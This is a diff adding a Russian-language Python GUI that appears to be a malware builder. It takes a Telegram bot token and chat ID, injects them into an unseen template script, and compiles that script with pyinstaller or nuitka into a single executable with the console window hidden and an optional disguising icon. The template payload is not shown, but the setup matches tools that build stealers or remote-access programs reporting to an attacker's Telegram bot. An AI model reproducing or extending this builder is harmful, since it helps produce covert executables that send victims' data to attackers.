@@ -1,0 +1,177 @@
+import customtkinter as ctk
+import os
+import shutil
+import tkinter.messagebox as messagebox
+import tkinter.filedialog as filedialog
+import subprocess
+from PIL import Image, ImageTk
+import threading  
+
+icon_path = ''
+save_directory = ''
+
+def select_icon():
+    global icon_path
+    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
+    if icon_path:
+        icon_label.configure(text=f"Иконка выбрана: {os.path.basename(icon_path)}")
+    else:
+        icon_label.configure(text="Иконка не выбрана")
+
+def select_directory():
+    global save_directory
+    save_directory = filedialog.askdirectory()
+    if save_directory:
+        directory_label.configure(text=f"Директория выбрана: {save_directory}")
+    else:
+        directory_label.configure(text="Директория не выбрана")
+
+def create_file():
+    def compilation_task():
+        bot_token = bot_token_entry.get()
+        chat_id = chat_id_entry.get()
+        selected_compiler = compiler_var.get()
+
+        source_file = os.path.join('data', 'example.py')
+        destination_dir = save_directory if save_directory else 'compile'
+        destination_file = os.path.join(destination_dir, 'compiled.py')
+
+        if not os.path.exists(destination_dir):
+            os.makedirs(destination_dir)
+
+        shutil.copyfile(source_file, destination_file)
+
+        with open(destination_file, 'r', encoding='utf-8') as file:
+            filedata = file.read()
+
+        filedata = filedata.replace('CHAT_ID_EXAMPLE', chat_id)
+        filedata = filedata.replace('BOT_TOKEN_EXAMPLE', bot_token)
+
+        with open(destination_file, 'w', encoding='utf-8') as file:
+            file.write(filedata)
+
+        original_dir = os.getcwd()
+        os.chdir(destination_dir)
+
+        if selected_compiler == "pyinstaller":
+            command = ['pyinstaller', '--onefile', '--noconsole']
+            if icon_path:
+                command.append(f'--icon={icon_path}')
+            command.append('compiled.py')
+        elif selected_compiler == "nuitka":
+            command = ['nuitka', '--onefile', '--windows-disable-console']
+            if icon_path:
+                command.append(f'--windows-icon-from-ico={icon_path}')
+            command.append('compiled.py')
+        else:
+            app.after(0, lambda: messagebox.showerror("Ошибка", f"Неизвестный компилятор: {selected_compiler}"))
+            os.chdir(original_dir)
+            return
+
+        try:
+            subprocess.run(command, check=True)
+            app.after(0, lambda: messagebox.showinfo("Успех", "Компиляция завершена успешно!"))
+        except subprocess.CalledProcessError as e:
+            app.after(0, lambda: messagebox.showerror("Ошибка компиляции", f"Произошла ошибка при компиляции:\n{e}"))
+        finally:
+            os.chdir(original_dir)
+
+    threading.Thread(target=compilation_task).start()
+
+def resize_background(event):
+    bg_image = Image.open('data/main.png')
+    bg_image = bg_image.resize((event.width, event.height), Image.LANCZOS)
+    photo = ImageTk.PhotoImage(bg_image)
+    image_label.configure(image=photo)
+    image_label.image = photo
+
+ctk.set_appearance_mode("dark")  
+ctk.set_default_color_theme("blue")
+
+app = ctk.CTk()
+app.geometry("800x480")
+app.title("@Dedulin && @RigOlit WindowsNB > pink edition (@Castles_Perehod, @RigOlit22)")
+
+bg_image = Image.open('data/main.png')
+bg_image = bg_image.resize((800, 480))
+photo = ImageTk.PhotoImage(bg_image)
+
+image_label = ctk.CTkLabel(app, image=photo)
+image_label.place(x=0, y=0, relwidth=1, relheight=1)
+image_label.image = photo
+
+app.bind("<Configure>", resize_background)
+
+frame = ctk.CTkFrame(app, width=400, height=400, corner_radius=10)
+frame.place(relx=0.5, rely=0.5, anchor=ctk.CENTER)
+
+bot_token_label = ctk.CTkLabel(frame, text="Введите бот токен", font=("Arial", 14), text_color="white")
+bot_token_label.pack(pady=(20, 5))
+bot_token_entry = ctk.CTkEntry(frame, width=300, font=("Arial", 14), text_color="white")
+bot_token_entry.pack(pady=(0, 10))
+
+chat_id_label = ctk.CTkLabel(frame, text="Введите чат айди", font=("Arial", 14), text_color="white")
+chat_id_label.pack(pady=(10, 5))
+chat_id_entry = ctk.CTkEntry(frame, width=300, font=("Arial", 14), text_color="white")
+chat_id_entry.pack(pady=(0, 20))
+
+pink_color = "#FF69B4"
+
+compiler_label = ctk.CTkLabel(frame, text="Выберите компилятор", font=("Arial", 14), text_color="white")
+compiler_label.pack(pady=(10, 5))
+
+compiler_options = ["nuitka", "pyinstaller"]
+compiler_var = ctk.StringVar(value=compiler_options[0])
+
+compiler_menu = ctk.CTkOptionMenu(
+    frame,
+    variable=compiler_var,
+    values=compiler_options,
+    font=("Arial", 14),
+    text_color="white",
+    fg_color=pink_color,
+    button_color=pink_color,
+    button_hover_color="#FF1493"
+)
+compiler_menu.pack(pady=(0, 10))
+
+icon_label = ctk.CTkLabel(frame, text="Иконка не выбрана", font=("Arial", 14), text_color=pink_color)
+icon_label.pack(pady=(10, 5))
+
+icon_button = ctk.CTkButton(
+    frame,
+    text="Выбрать иконку",
+    command=select_icon,
+    font=("Arial", 14),
+    text_color="white",
+    fg_color=pink_color,
+    hover_color="#FF1493"
+)
+icon_button.pack(pady=(0, 10))
+
+directory_label = ctk.CTkLabel(frame, text="Директория не выбрана", font=("Arial", 14), text_color=pink_color)
+directory_label.pack(pady=(10, 5))
+
+directory_button = ctk.CTkButton(
+    frame,
+    text="Выбрать директорию",
+    command=select_directory,
+    font=("Arial", 14),
+    text_color="white",
+    fg_color=pink_color,
+    hover_color="#FF1493"
+)
+directory_button.pack(pady=(0, 10))
+
+create_button = ctk.CTkButton(
+    frame,
+    text="Создать файл",
+    command=create_file,
+    font=("Arial", 14),
+    text_color="white",
+    fg_color=pink_color,
+    hover_color="#FF1493"
+)
+create_button.pack(pady=20)
+
+app.mainloop()
